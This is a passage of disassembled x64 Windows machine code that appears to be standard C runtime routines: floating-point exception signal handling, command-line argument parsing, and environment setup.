   14000335c:	e8 db ea ff ff       	call   0x140001e3c
   140003361:	48 83 08 04          	orq    $0x4,(%rax)
   140003365:	e8 da ea ff ff       	call   0x140001e44
   14000336a:	48 83 08 02          	orq    $0x2,(%rax)
   14000336e:	33 c0                	xor    %eax,%eax
   140003370:	48 83 c4 28          	add    $0x28,%rsp
   140003374:	c3                   	ret
   140003375:	90                   	nop
   140003376:	90                   	nop
   140003377:	90                   	nop
   140003378:	48 83 ec 28          	sub    $0x28,%rsp
   14000337c:	48 85 c9             	test   %rcx,%rcx
   14000337f:	75 19                	jne    0x14000339a
   140003381:	e8 6a 19 00 00       	call   0x140004cf0
   140003386:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000338c:	e8 3f 18 00 00       	call   0x140004bd0
   140003391:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140003395:	48 83 c4 28          	add    $0x28,%rsp
   140003399:	c3                   	ret
   14000339a:	4c 8b c1             	mov    %rcx,%r8
   14000339d:	33 d2                	xor    %edx,%edx
   14000339f:	48 8b 0d 4a 2e 01 00 	mov    0x12e4a(%rip),%rcx        # 0x1400161f0
   1400033a6:	48 83 c4 28          	add    $0x28,%rsp
   1400033aa:	48 ff 25 a7 8d 00 00 	rex.W jmp *0x8da7(%rip)        # 0x14000c158
   1400033b1:	90                   	nop
   1400033b2:	90                   	nop
   1400033b3:	90                   	nop
   1400033b4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400033b9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400033be:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400033c3:	57                   	push   %rdi
   1400033c4:	48 83 ec 20          	sub    $0x20,%rsp
   1400033c8:	48 8b f2             	mov    %rdx,%rsi
   1400033cb:	8b f9                	mov    %ecx,%edi
   1400033cd:	e8 72 1d 00 00       	call   0x140005144
   1400033d2:	45 33 c0             	xor    %r8d,%r8d
   1400033d5:	48 8b d8             	mov    %rax,%rbx
   1400033d8:	48 85 c0             	test   %rax,%rax
   1400033db:	75 07                	jne    0x1400033e4
   1400033dd:	33 c0                	xor    %eax,%eax
   1400033df:	e9 48 01 00 00       	jmp    0x14000352c
   1400033e4:	48 8b 08             	mov    (%rax),%rcx
   1400033e7:	48 8b c1             	mov    %rcx,%rax
   1400033ea:	48 8d 91 c0 00 00 00 	lea    0xc0(%rcx),%rdx
   1400033f1:	48 3b ca             	cmp    %rdx,%rcx
   1400033f4:	74 0d                	je     0x140003403
   1400033f6:	39 38                	cmp    %edi,(%rax)
   1400033f8:	74 0c                	je     0x140003406
   1400033fa:	48 83 c0 10          	add    $0x10,%rax
   1400033fe:	48 3b c2             	cmp    %rdx,%rax
   140003401:	75 f3                	jne    0x1400033f6
   140003403:	49 8b c0             	mov    %r8,%rax
   140003406:	48 85 c0             	test   %rax,%rax
   140003409:	74 d2                	je     0x1400033dd
   14000340b:	48 8b 78 08          	mov    0x8(%rax),%rdi
   14000340f:	48 85 ff             	test   %rdi,%rdi
   140003412:	74 c9                	je     0x1400033dd
   140003414:	48 83 ff 05          	cmp    $0x5,%rdi
   140003418:	75 0c                	jne    0x140003426
   14000341a:	4c 89 40 08          	mov    %r8,0x8(%rax)
   14000341e:	8d 47 fc             	lea    -0x4(%rdi),%eax
   140003421:	e9 06 01 00 00       	jmp    0x14000352c
   140003426:	48 83 ff 01          	cmp    $0x1,%rdi
   14000342a:	0f 84 f9 00 00 00    	je     0x140003529
   140003430:	48 8b 6b 08          	mov    0x8(%rbx),%rbp
   140003434:	48 89 73 08          	mov    %rsi,0x8(%rbx)
   140003438:	8b 70 04             	mov    0x4(%rax),%esi
   14000343b:	83 fe 08             	cmp    $0x8,%esi
   14000343e:	0f 85 d0 00 00 00    	jne    0x140003514
   140003444:	48 83 c1 30          	add    $0x30,%rcx
   140003448:	48 8d 91 90 00 00 00 	lea    0x90(%rcx),%rdx
   14000344f:	eb 08                	jmp    0x140003459
   140003451:	4c 89 41 08          	mov    %r8,0x8(%rcx)
   140003455:	48 83 c1 10          	add    $0x10,%rcx
   140003459:	48 3b ca             	cmp    %rdx,%rcx
   14000345c:	75 f3                	jne    0x140003451
   14000345e:	81 38 8d 00 00 c0    	cmpl   $0xc000008d,(%rax)
   140003464:	8b 73 10             	mov    0x10(%rbx),%esi
   140003467:	0f 84 88 00 00 00    	je     0x1400034f5
   14000346d:	81 38 8e 00 00 c0    	cmpl   $0xc000008e,(%rax)
   140003473:	74 77                	je     0x1400034ec
   140003475:	81 38 8f 00 00 c0    	cmpl   $0xc000008f,(%rax)
   14000347b:	74 66                	je     0x1400034e3
   14000347d:	81 38 90 00 00 c0    	cmpl   $0xc0000090,(%rax)
   140003483:	74 55                	je     0x1400034da
   140003485:	81 38 91 00 00 c0    	cmpl   $0xc0000091,(%rax)
   14000348b:	74 44                	je     0x1400034d1
   14000348d:	81 38 92 00 00 c0    	cmpl   $0xc0000092,(%rax)
   140003493:	74 33                	je     0x1400034c8
   140003495:	81 38 93 00 00 c0    	cmpl   $0xc0000093,(%rax)
   14000349b:	74 22                	je     0x1400034bf
   14000349d:	81 38 b4 02 00 c0    	cmpl   $0xc00002b4,(%rax)
   1400034a3:	74 11                	je     0x1400034b6
   1400034a5:	81 38 b5 02 00 c0    	cmpl   $0xc00002b5,(%rax)
   1400034ab:	75 4f                	jne    0x1400034fc
   1400034ad:	c7 43 10 8d 00 00 00 	movl   $0x8d,0x10(%rbx)
   1400034b4:	eb 46                	jmp    0x1400034fc
   1400034b6:	c7 43 10 8e 00 00 00 	movl   $0x8e,0x10(%rbx)
   1400034bd:	eb 3d                	jmp    0x1400034fc
   1400034bf:	c7 43 10 85 00 00 00 	movl   $0x85,0x10(%rbx)
   1400034c6:	eb 34                	jmp    0x1400034fc
   1400034c8:	c7 43 10 8a 00 00 00 	movl   $0x8a,0x10(%rbx)
   1400034cf:	eb 2b                	jmp    0x1400034fc
   1400034d1:	c7 43 10 84 00 00 00 	movl   $0x84,0x10(%rbx)
   1400034d8:	eb 22                	jmp    0x1400034fc
   1400034da:	c7 43 10 81 00 00 00 	movl   $0x81,0x10(%rbx)
   1400034e1:	eb 19                	jmp    0x1400034fc
   1400034e3:	c7 43 10 86 00 00 00 	movl   $0x86,0x10(%rbx)
   1400034ea:	eb 10                	jmp    0x1400034fc
   1400034ec:	c7 43 10 83 00 00 00 	movl   $0x83,0x10(%rbx)
   1400034f3:	eb 07                	jmp    0x1400034fc
   1400034f5:	c7 43 10 82 00 00 00 	movl   $0x82,0x10(%rbx)
   1400034fc:	48 8b cf             	mov    %rdi,%rcx
   1400034ff:	ff 15 83 8d 00 00    	call   *0x8d83(%rip)        # 0x14000c288
   140003505:	8b 53 10             	mov    0x10(%rbx),%edx
   140003508:	b9 08 00 00 00       	mov    $0x8,%ecx
   14000350d:	ff d7                	call   *%rdi
   14000350f:	89 73 10             	mov    %esi,0x10(%rbx)
   140003512:	eb 11                	jmp    0x140003525
   140003514:	48 8b cf             	mov    %rdi,%rcx
   140003517:	4c 89 40 08          	mov    %r8,0x8(%rax)
   14000351b:	ff 15 67 8d 00 00    	call   *0x8d67(%rip)        # 0x14000c288
   140003521:	8b ce                	mov    %esi,%ecx
   140003523:	ff d7                	call   *%rdi
   140003525:	48 89 6b 08          	mov    %rbp,0x8(%rbx)
   140003529:	83 c8 ff             	or     $0xffffffff,%eax
   14000352c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140003531:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140003536:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000353b:	48 83 c4 20          	add    $0x20,%rsp
   14000353f:	5f                   	pop    %rdi
   140003540:	c3                   	ret
   140003541:	90                   	nop
   140003542:	90                   	nop
   140003543:	90                   	nop
   140003544:	8b 05 16 2b 01 00    	mov    0x12b16(%rip),%eax        # 0x140016060
   14000354a:	c3                   	ret
   14000354b:	90                   	nop
   14000354c:	89 0d 0e 2b 01 00    	mov    %ecx,0x12b0e(%rip)        # 0x140016060
   140003552:	c3                   	ret
   140003553:	90                   	nop
   140003554:	48 8b 15 bd 1a 01 00 	mov    0x11abd(%rip),%rdx        # 0x140015018
   14000355b:	8b ca                	mov    %edx,%ecx
   14000355d:	48 33 15 04 2b 01 00 	xor    0x12b04(%rip),%rdx        # 0x140016068
   140003564:	83 e1 3f             	and    $0x3f,%ecx
   140003567:	48 d3 ca             	ror    %cl,%rdx
   14000356a:	48 85 d2             	test   %rdx,%rdx
   14000356d:	0f 95 c0             	setne  %al
   140003570:	c3                   	ret
   140003571:	90                   	nop
   140003572:	90                   	nop
   140003573:	90                   	nop
   140003574:	48 89 0d ed 2a 01 00 	mov    %rcx,0x12aed(%rip)        # 0x140016068
   14000357b:	c3                   	ret
   14000357c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003581:	57                   	push   %rdi
   140003582:	48 83 ec 20          	sub    $0x20,%rsp
   140003586:	48 8b 1d 8b 1a 01 00 	mov    0x11a8b(%rip),%rbx        # 0x140015018
   14000358d:	48 8b f9             	mov    %rcx,%rdi
   140003590:	8b cb                	mov    %ebx,%ecx
   140003592:	48 33 1d cf 2a 01 00 	xor    0x12acf(%rip),%rbx        # 0x140016068
   140003599:	83 e1 3f             	and    $0x3f,%ecx
   14000359c:	48 d3 cb             	ror    %cl,%rbx
   14000359f:	48 85 db             	test   %rbx,%rbx
   1400035a2:	75 04                	jne    0x1400035a8
   1400035a4:	33 c0                	xor    %eax,%eax
   1400035a6:	eb 0e                	jmp    0x1400035b6
   1400035a8:	48 8b cb             	mov    %rbx,%rcx
   1400035ab:	ff 15 d7 8c 00 00    	call   *0x8cd7(%rip)        # 0x14000c288
   1400035b1:	48 8b cf             	mov    %rdi,%rcx
   1400035b4:	ff d3                	call   *%rbx
   1400035b6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400035bb:	48 83 c4 20          	add    $0x20,%rsp
   1400035bf:	5f                   	pop    %rdi
   1400035c0:	c3                   	ret
   1400035c1:	90                   	nop
   1400035c2:	90                   	nop
   1400035c3:	90                   	nop
   1400035c4:	4c 8b 05 4d 1a 01 00 	mov    0x11a4d(%rip),%r8        # 0x140015018
   1400035cb:	4c 8b c9             	mov    %rcx,%r9
   1400035ce:	41 8b d0             	mov    %r8d,%edx
   1400035d1:	b9 40 00 00 00       	mov    $0x40,%ecx
   1400035d6:	83 e2 3f             	and    $0x3f,%edx
   1400035d9:	2b ca                	sub    %edx,%ecx
   1400035db:	49 d3 c9             	ror    %cl,%r9
   1400035de:	4d 33 c8             	xor    %r8,%r9
   1400035e1:	4c 89 0d 80 2a 01 00 	mov    %r9,0x12a80(%rip)        # 0x140016068
   1400035e8:	c3                   	ret
   1400035e9:	90                   	nop
   1400035ea:	90                   	nop
   1400035eb:	90                   	nop
   1400035ec:	48 8b c4             	mov    %rsp,%rax
   1400035ef:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400035f3:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1400035f7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400035fb:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400035ff:	41 54                	push   %r12
   140003601:	41 56                	push   %r14
   140003603:	41 57                	push   %r15
   140003605:	48 83 ec 20          	sub    $0x20,%rsp
   140003609:	4c 8b 7c 24 60       	mov    0x60(%rsp),%r15
   14000360e:	4d 8b e1             	mov    %r9,%r12
   140003611:	49 8b f8             	mov    %r8,%rdi
   140003614:	4c 8b f2             	mov    %rdx,%r14
   140003617:	48 8b d9             	mov    %rcx,%rbx
   14000361a:	49 83 27 00          	andq   $0x0,(%r15)
   14000361e:	49 c7 01 01 00 00 00 	movq   $0x1,(%r9)
   140003625:	48 85 d2             	test   %rdx,%rdx
   140003628:	74 07                	je     0x140003631
   14000362a:	4c 89 02             	mov    %r8,(%rdx)
   14000362d:	49 83 c6 08          	add    $0x8,%r14
   140003631:	40 32 ed             	xor    %bpl,%bpl
   140003634:	80 3b 22             	cmpb   $0x22,(%rbx)
   140003637:	75 0f                	jne    0x140003648
   140003639:	40 84 ed             	test   %bpl,%bpl
   14000363c:	40 b6 22             	mov    $0x22,%sil
   14000363f:	40 0f 94 c5          	sete   %bpl
   140003643:	48 ff c3             	inc    %rbx
   140003646:	eb 37                	jmp    0x14000367f
   140003648:	49 ff 07             	incq   (%r15)
   14000364b:	48 85 ff             	test   %rdi,%rdi
   14000364e:	74 07                	je     0x140003657
   140003650:	8a 03                	mov    (%rbx),%al
   140003652:	88 07                	mov    %al,(%rdi)
   140003654:	48 ff c7             	inc    %rdi
   140003657:	0f be 33             	movsbl (%rbx),%esi
   14000365a:	48 ff c3             	inc    %rbx
   14000365d:	8b ce                	mov    %esi,%ecx
   14000365f:	e8 90 2c 00 00       	call   0x1400062f4
   140003664:	85 c0                	test   %eax,%eax
   140003666:	74 12                	je     0x14000367a
   140003668:	49 ff 07             	incq   (%r15)
   14000366b:	48 85 ff             	test   %rdi,%rdi
   14000366e:	74 07                	je     0x140003677
   140003670:	8a 03                	mov    (%rbx),%al
   140003672:	88 07                	mov    %al,(%rdi)
   140003674:	48 ff c7             	inc    %rdi
   140003677:	48 ff c3             	inc    %rbx
   14000367a:	40 84 f6             	test   %sil,%sil
   14000367d:	74 1c                	je     0x14000369b
   14000367f:	40 84 ed             	test   %bpl,%bpl
   140003682:	75 b0                	jne    0x140003634
   140003684:	40 80 fe 20          	cmp    $0x20,%sil
   140003688:	74 06                	je     0x140003690
   14000368a:	40 80 fe 09          	cmp    $0x9,%sil
   14000368e:	75 a4                	jne    0x140003634
   140003690:	48 85 ff             	test   %rdi,%rdi
   140003693:	74 09                	je     0x14000369e
   140003695:	c6 47 ff 00          	movb   $0x0,-0x1(%rdi)
   140003699:	eb 03                	jmp    0x14000369e
   14000369b:	48 ff cb             	dec    %rbx
   14000369e:	40 32 f6             	xor    %sil,%sil
   1400036a1:	80 3b 00             	cmpb   $0x0,(%rbx)
   1400036a4:	0f 84 d2 00 00 00    	je     0x14000377c
   1400036aa:	80 3b 20             	cmpb   $0x20,(%rbx)
   1400036ad:	74 05                	je     0x1400036b4
   1400036af:	80 3b 09             	cmpb   $0x9,(%rbx)
   1400036b2:	75 05                	jne    0x1400036b9
   1400036b4:	48 ff c3             	inc    %rbx
   1400036b7:	eb f1                	jmp    0x1400036aa
   1400036b9:	80 3b 00             	cmpb   $0x0,(%rbx)
   1400036bc:	0f 84 ba 00 00 00    	je     0x14000377c
   1400036c2:	4d 85 f6             	test   %r14,%r14
   1400036c5:	74 07                	je     0x1400036ce
   1400036c7:	49 89 3e             	mov    %rdi,(%r14)
   1400036ca:	49 83 c6 08          	add    $0x8,%r14
   1400036ce:	49 ff 04 24          	incq   (%r12)
   1400036d2:	ba 01 00 00 00       	mov    $0x1,%edx
   1400036d7:	33 c0                	xor    %eax,%eax
   1400036d9:	eb 05                	jmp    0x1400036e0
   1400036db:	48 ff c3             	inc    %rbx
   1400036de:	ff c0                	inc    %eax
   1400036e0:	80 3b 5c             	cmpb   $0x5c,(%rbx)
   1400036e3:	74 f6                	je     0x1400036db
   1400036e5:	80 3b 22             	cmpb   $0x22,(%rbx)
   1400036e8:	75 31                	jne    0x14000371b
   1400036ea:	84 c2                	test   %al,%dl
   1400036ec:	75 19                	jne    0x140003707
   1400036ee:	40 84 f6             	test   %sil,%sil
   1400036f1:	74 0b                	je     0x1400036fe
   1400036f3:	80 7b 01 22          	cmpb   $0x22,0x1(%rbx)
   1400036f7:	75 05                	jne    0x1400036fe
   1400036f9:	48 ff c3             	inc    %rbx
   1400036fc:	eb 09                	jmp    0x140003707
   1400036fe:	33 d2                	xor    %edx,%edx
   140003700:	40 84 f6             	test   %sil,%sil
   140003703:	40 0f 94 c6          	sete   %sil
   140003707:	d1 e8                	shr    $1,%eax
   140003709:	eb 10                	jmp    0x14000371b
   14000370b:	ff c8                	dec    %eax
   14000370d:	48 85 ff             	test   %rdi,%rdi
   140003710:	74 06                	je     0x140003718
   140003712:	c6 07 5c             	movb   $0x5c,(%rdi)
   140003715:	48 ff c7             	inc    %rdi
   140003718:	49 ff 07             	incq   (%r15)
   14000371b:	85 c0                	test   %eax,%eax
   14000371d:	75 ec                	jne    0x14000370b
   14000371f:	8a 03                	mov    (%rbx),%al
   140003721:	84 c0                	test   %al,%al
   140003723:	74 44                	je     0x140003769
   140003725:	40 84 f6             	test   %sil,%sil
   140003728:	75 08                	jne    0x140003732
   14000372a:	3c 20                	cmp    $0x20,%al
   14000372c:	74 3b                	je     0x140003769
   14000372e:	3c 09                	cmp    $0x9,%al
   140003730:	74 37                	je     0x140003769
   140003732:	85 d2                	test   %edx,%edx
   140003734:	74 2b                	je     0x140003761
   140003736:	48 85 ff             	test   %rdi,%rdi
   140003739:	74 05                	je     0x140003740
   14000373b:	88 07                	mov    %al,(%rdi)
   14000373d:	48 ff c7             	inc    %rdi
   140003740:	0f be 0b             	movsbl (%rbx),%ecx
   140003743:	e8 ac 2b 00 00       	call   0x1400062f4
   140003748:	85 c0                	test   %eax,%eax
   14000374a:	74 12                	je     0x14000375e
   14000374c:	49 ff 07             	incq   (%r15)
   14000374f:	48 ff c3             	inc    %rbx
   140003752:	48 85 ff             	test   %rdi,%rdi
   140003755:	74 07                	je     0x14000375e
   140003757:	8a 03                	mov    (%rbx),%al
   140003759:	88 07                	mov    %al,(%rdi)
   14000375b:	48 ff c7             	inc    %rdi
   14000375e:	49 ff 07             	incq   (%r15)
   140003761:	48 ff c3             	inc    %rbx
   140003764:	e9 69 ff ff ff       	jmp    0x1400036d2
   140003769:	48 85 ff             	test   %rdi,%rdi
   14000376c:	74 06                	je     0x140003774
   14000376e:	c6 07 00             	movb   $0x0,(%rdi)
   140003771:	48 ff c7             	inc    %rdi
   140003774:	49 ff 07             	incq   (%r15)
   140003777:	e9 25 ff ff ff       	jmp    0x1400036a1
   14000377c:	4d 85 f6             	test   %r14,%r14
   14000377f:	74 04                	je     0x140003785
   140003781:	49 83 26 00          	andq   $0x0,(%r14)
   140003785:	49 ff 04 24          	incq   (%r12)
   140003789:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000378e:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140003793:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140003798:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   14000379d:	48 83 c4 20          	add    $0x20,%rsp
   1400037a1:	41 5f                	pop    %r15
   1400037a3:	41 5e                	pop    %r14
   1400037a5:	41 5c                	pop    %r12
   1400037a7:	c3                   	ret
   1400037a8:	53                   	push   %rbx
   1400037a9:	48 83 ec 20          	sub    $0x20,%rsp
   1400037ad:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   1400037b4:	ff ff 1f 
   1400037b7:	4c 8b ca             	mov    %rdx,%r9
   1400037ba:	4c 8b d1             	mov    %rcx,%r10
   1400037bd:	48 3b c8             	cmp    %rax,%rcx
   1400037c0:	72 04                	jb     0x1400037c6
   1400037c2:	33 c0                	xor    %eax,%eax
   1400037c4:	eb 3c                	jmp    0x140003802
   1400037c6:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   1400037ca:	33 d2                	xor    %edx,%edx
   1400037cc:	48 8b c1             	mov    %rcx,%rax
   1400037cf:	49 f7 f0             	div    %r8
   1400037d2:	4c 3b c8             	cmp    %rax,%r9
   1400037d5:	73 eb                	jae    0x1400037c2
   1400037d7:	49 c1 e2 03          	shl    $0x3,%r10
   1400037db:	4d 0f af c8          	imul   %r8,%r9
   1400037df:	49 2b ca             	sub    %r10,%rcx
   1400037e2:	49 3b c9             	cmp    %r9,%rcx
   1400037e5:	76 db                	jbe    0x1400037c2
   1400037e7:	4b 8d 0c 11          	lea    (%r9,%r10,1),%rcx
   1400037eb:	ba 01 00 00 00       	mov    $0x1,%edx
   1400037f0:	e8 43 10 00 00       	call   0x140004838
   1400037f5:	33 c9                	xor    %ecx,%ecx
   1400037f7:	48 8b d8             	mov    %rax,%rbx
   1400037fa:	e8 41 0f 00 00       	call   0x140004740
   1400037ff:	48 8b c3             	mov    %rbx,%rax
   140003802:	48 83 c4 20          	add    $0x20,%rsp
   140003806:	5b                   	pop    %rbx
   140003807:	c3                   	ret
   140003808:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000380d:	55                   	push   %rbp
   14000380e:	56                   	push   %rsi
   14000380f:	57                   	push   %rdi
   140003810:	41 56                	push   %r14
   140003812:	41 57                	push   %r15
   140003814:	48 8b ec             	mov    %rsp,%rbp
   140003817:	48 83 ec 30          	sub    $0x30,%rsp
   14000381b:	8d 41 ff             	lea    -0x1(%rcx),%eax
   14000381e:	44 8b f1             	mov    %ecx,%r14d
   140003821:	83 f8 01             	cmp    $0x1,%eax
   140003824:	76 16                	jbe    0x14000383c
   140003826:	e8 c5 14 00 00       	call   0x140004cf0
   14000382b:	bf 16 00 00 00       	mov    $0x16,%edi
   140003830:	89 38                	mov    %edi,(%rax)
   140003832:	e8 99 13 00 00       	call   0x140004bd0
   140003837:	e9 2f 01 00 00       	jmp    0x14000396b
   14000383c:	e8 ab 26 00 00       	call   0x140005eec
   140003841:	48 8d 1d 28 28 01 00 	lea    0x12828(%rip),%rbx        # 0x140016070
   140003848:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   14000384e:	48 8b d3             	mov    %rbx,%rdx
   140003851:	33 c9                	xor    %ecx,%ecx
   140003853:	ff 15 17 89 00 00    	call   *0x8917(%rip)        # 0x14000c170
   140003859:	48 8b 35 d0 29 01 00 	mov    0x129d0(%rip),%rsi        # 0x140016230
   140003860:	33 ff                	xor    %edi,%edi
   140003862:	48 89 1d d7 29 01 00 	mov    %rbx,0x129d7(%rip)        # 0x140016240
   140003869:	48 85 f6             	test   %rsi,%rsi
   14000386c:	74 05                	je     0x140003873
   14000386e:	40 38 3e             	cmp    %dil,(%rsi)
   140003871:	75 03                	jne    0x140003876
   140003873:	48 8b f3             	mov    %rbx,%rsi
   140003876:	48 8d 45 48          	lea    0x48(%rbp),%rax
   14000387a:	48 89 7d 40          	mov    %rdi,0x40(%rbp)
   14000387e:	4c 8d 4d 40          	lea    0x40(%rbp),%r9
   140003882:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140003887:	45 33 c0             	xor    %r8d,%r8d
   14000388a:	48 89 7d 48          	mov    %rdi,0x48(%rbp)
   14000388e:	33 d2                	xor    %edx,%edx
   140003890:	48 8b ce             	mov    %rsi,%rcx
   140003893:	e8 54 fd ff ff       	call   0x1400035ec
   140003898:	4c 8b 7d 40          	mov    0x40(%rbp),%r15
   14000389c:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   1400038a2:	48 8b 55 48          	mov    0x48(%rbp),%rdx
   1400038a6:	49 8b cf             	mov    %r15,%rcx
   1400038a9:	e8 fa fe ff ff       	call   0x1400037a8
   1400038ae:	48 8b d8             	mov    %rax,%rbx
   1400038b1:	48 85 c0             	test   %rax,%rax
   1400038b4:	75 11                	jne    0x1400038c7
   1400038b6:	e8 35 14 00 00       	call   0x140004cf0
   1400038bb:	8d 7b 0c             	lea    0xc(%rbx),%edi
   1400038be:	89 38                	mov    %edi,(%rax)
   1400038c0:	33 c9                	xor    %ecx,%ecx
   1400038c2:	e9 9f 00 00 00       	jmp    0x140003966
   1400038c7:	4e 8d 04 f8          	lea    (%rax,%r15,8),%r8
   1400038cb:	48 8b d3             	mov    %rbx,%rdx
   1400038ce:	48 8d 45 48          	lea    0x48(%rbp),%rax
   1400038d2:	48 8b ce             	mov    %rsi,%rcx
   1400038d5:	4c 8d 4d 40          	lea    0x40(%rbp),%r9
   1400038d9:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400038de:	e8 09 fd ff ff       	call   0x1400035ec
   1400038e3:	41 83 fe 01          	cmp    $0x1,%r14d
   1400038e7:	75 14                	jne    0x1400038fd
   1400038e9:	8b 45 40             	mov    0x40(%rbp),%eax
   1400038ec:	ff c8                	dec    %eax
   1400038ee:	48 89 1d 2b 29 01 00 	mov    %rbx,0x1292b(%rip)        # 0x140016220
   1400038f5:	89 05 21 29 01 00    	mov    %eax,0x12921(%rip)        # 0x14001621c
   1400038fb:	eb c3                	jmp    0x1400038c0
   1400038fd:	48 8d 55 38          	lea    0x38(%rbp),%rdx
   140003901:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140003905:	48 8b cb             	mov    %rbx,%rcx
   140003908:	e8 db 1e 00 00       	call   0x1400057e8
   14000390d:	8b f0                	mov    %eax,%esi
   14000390f:	85 c0                	test   %eax,%eax
   140003911:	74 19                	je     0x14000392c
   140003913:	48 8b 4d 38          	mov    0x38(%rbp),%rcx
   140003917:	e8 24 0e 00 00       	call   0x140004740
   14000391c:	48 8b cb             	mov    %rbx,%rcx
   14000391f:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140003923:	e8 18 0e 00 00       	call   0x140004740
   140003928:	8b fe                	mov    %esi,%edi
   14000392a:	eb 3f                	jmp    0x14000396b
   14000392c:	48 8b 55 38          	mov    0x38(%rbp),%rdx
   140003930:	48 8b cf             	mov    %rdi,%rcx
   140003933:	48 8b c2             	mov    %rdx,%rax
   140003936:	48 39 3a             	cmp    %rdi,(%rdx)
   140003939:	74 0c                	je     0x140003947
   14000393b:	48 8d 40 08          	lea    0x8(%rax),%rax
   14000393f:	48 ff c1             	inc    %rcx
   140003942:	48 39 38             	cmp    %rdi,(%rax)
   140003945:	75 f4                	jne    0x14000393b
   140003947:	89 0d cf 28 01 00    	mov    %ecx,0x128cf(%rip)        # 0x14001621c
   14000394d:	33 c9                	xor    %ecx,%ecx
   14000394f:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140003953:	48 89 15 c6 28 01 00 	mov    %rdx,0x128c6(%rip)        # 0x140016220
   14000395a:	e8 e1 0d 00 00       	call   0x140004740
   14000395f:	48 8b cb             	mov    %rbx,%rcx
   140003962:	48 89 7d 38          	mov    %rdi,0x38(%rbp)
   140003966:	e8 d5 0d 00 00       	call   0x140004740
   14000396b:	8b c7                	mov    %edi,%eax
   14000396d:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140003972:	48 83 c4 30          	add    $0x30,%rsp
   140003976:	41 5f                	pop    %r15
   140003978:	41 5e                	pop    %r14
   14000397a:	5f                   	pop    %rdi
   14000397b:	5e                   	pop    %rsi
   14000397c:	5d                   	pop    %rbp
   14000397d:	c3                   	ret
   14000397e:	90                   	nop
   14000397f:	90                   	nop
   140003980:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003985:	57                   	push   %rdi
   140003986:	48 83 ec 20          	sub    $0x20,%rsp
   14000398a:	33 ff                	xor    %edi,%edi
   14000398c:	48 39 3d e5 27 01 00 	cmp    %rdi,0x127e5(%rip)        # 0x140016178
   140003993:	74 04                	je     0x140003999
   140003995:	33 c0                	xor    %eax,%eax
   140003997:	eb 48                	jmp    0x1400039e1
   140003999:	e8 4e 25 00 00       	call   0x140005eec
   14000399e:	e8 8d 29 00 00       	call   0x140006330
   1400039a3:	48 8b d8             	mov    %rax,%rbx
   1400039a6:	48 85 c0             	test   %rax,%rax
   1400039a9:	75 05                	jne    0x1400039b0
   1400039ab:	83 cf ff             	or     $0xffffffff,%edi
   1400039ae:	eb 27                	jmp    0x1400039d7
   1400039b0:	48 8b c8             	mov    %rax,%rcx
   1400039b3:	e8 38 00 00 00       	call   0x1400039f0
   1400039b8:	48 85 c0             	test   %rax,%rax
   1400039bb:	75 05                	jne    0x1400039c2
   1400039bd:	83 cf ff             	or     $0xffffffff,%edi
   1400039c0:	eb 0e                	jmp    0x1400039d0
   1400039c2:	48 89 05 c7 27 01 00 	mov    %rax,0x127c7(%rip)        # 0x140016190
   1400039c9:	48 89 05 a8 27 01 00 	mov    %rax,0x127a8(%rip)        # 0x140016178
   1400039d0:	33 c9                	xor    %ecx,%ecx
   1400039d2:	e8 69 0d 00 00       	call   0x140004740
   1400039d7:	48 8b cb             	mov    %rbx,%rcx
   1400039da:	e8 61 0d 00 00       	call   0x140004740
   1400039df:	8b c7                	mov    %edi,%eax
   1400039e1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400039e6:	48 83 c4 20          	add    $0x20,%rsp
   1400039ea:	5f                   	pop    %rdi
   1400039eb:	c3                   	ret
   1400039ec:	90                   	nop
   1400039ed:	90                   	nop
   1400039ee:	90                   	nop
   1400039ef:	90                   	nop
   1400039f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400039f5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400039fa:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400039ff:	57                   	push   %rdi
   140003a00:	41 56                	push   %r14
   140003a02:	41 57                	push   %r15
   140003a04:	48 83 ec 30          	sub    $0x30,%rsp
   140003a08:	33 f6                	xor    %esi,%esi
   140003a0a:	4c 8b f1             	mov    %rcx,%r14
   140003a0d:	8b d6                	mov    %esi,%edx
   140003a0f:	eb 1a                	jmp    0x140003a2b
   140003a11:	3c 3d                	cmp    $0x3d,%al
   140003a13:	74 03                	je     0x140003a18
   140003a15:	48 ff c2             	inc    %rdx
   140003a18:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140003a1c:	48 ff c0             	inc    %rax
   140003a1f:	40 38 34 01          	cmp    %sil,(%rcx,%rax,1)
   140003a23:	75 f7                	jne    0x140003a1c
   140003a25:	48 ff c1             	inc    %rcx
   140003a28:	48 03 c8             	add    %rax,%rcx
   140003a2b:	8a 01                	mov    (%rcx),%al
   140003a2d:	84 c0                	test   %al,%al
   140003a2f:	75 e0                	jne    0x140003a11
